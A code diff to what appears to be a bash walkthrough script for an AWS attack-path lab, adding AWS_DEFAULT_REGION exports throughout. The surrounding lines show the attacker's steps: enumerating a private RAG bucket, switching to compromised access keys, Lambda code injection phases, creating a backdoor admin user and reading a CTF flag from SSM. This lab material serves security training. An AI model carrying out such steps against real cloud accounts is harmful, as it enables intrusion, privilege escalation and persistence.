@@ -152,6 +152,7 @@ echo -e "${YELLOW}and begin enumerating accessible resources.${NC}"
 echo ""
 use_starting_user_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 show_cmd "Attacker ($STARTING_USER)" "aws sts get-caller-identity"
 CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
@@ -165,6 +166,7 @@ fi
 # [OBSERVATION] Get account ID
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
@@ -176,6 +178,7 @@ echo -e "${YELLOW}on a private RAG data bucket used by the ML pipeline.${NC}"
 echo ""
 use_starting_user_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 show_attack_cmd "Attacker ($STARTING_USER)" "aws s3 ls s3://$RAG_BUCKET/ --recursive"
 aws s3 ls s3://$RAG_BUCKET/ --recursive
@@ -219,6 +222,7 @@ export AWS_ACCESS_KEY_ID="$COMPROMISED_KEY_ID"
 export AWS_SECRET_ACCESS_KEY="$COMPROMISED_SECRET_KEY"
 unset AWS_SESSION_TOKEN
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 show_cmd "Attacker ($COMPROMISED_USER)" "aws sts get-caller-identity"
 COMPROMISED_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
@@ -366,6 +370,7 @@ export AWS_ACCESS_KEY_ID="$COMPROMISED_KEY_ID"
 export AWS_SECRET_ACCESS_KEY="$COMPROMISED_SECRET_KEY"
 unset AWS_SESSION_TOKEN
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 # =============================================================================
 # Phase 4: Lambda Code Injection — Attempt 1 (targets admingh, fails)
@@ -572,6 +577,7 @@ export AWS_ACCESS_KEY_ID="$FRICK_KEY_ID"
 export AWS_SECRET_ACCESS_KEY="$FRICK_SECRET_KEY"
 unset AWS_SESSION_TOKEN
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 echo -e "${YELLOW}Waiting 15 seconds for new credentials to propagate...${NC}"
 sleep 15
@@ -631,6 +637,7 @@ export AWS_ACCESS_KEY_ID="$FRICK_KEY_ID"
 export AWS_SECRET_ACCESS_KEY="$FRICK_SECRET_KEY"
 unset AWS_SESSION_TOKEN
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 # [EXPLOIT] Create persistent backdoor admin user
 echo -e "${YELLOW}The attacker creates a backdoor admin user to maintain persistence even if${NC}"
@@ -1002,6 +1009,7 @@ export AWS_ACCESS_KEY_ID="$FRICK_KEY_ID"
 export AWS_SECRET_ACCESS_KEY="$FRICK_SECRET_KEY"
 unset AWS_SESSION_TOKEN
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 show_attack_cmd "Attacker ($FRICK_USERNAME)" "aws ssm get-parameter --region $AWS_REGION --name /pathfinding-labs/flags/sysdig-8-minutes-to-admin-to-admin --query Parameter.Value --output text"
 CTF_FLAG=$(aws ssm get-parameter \
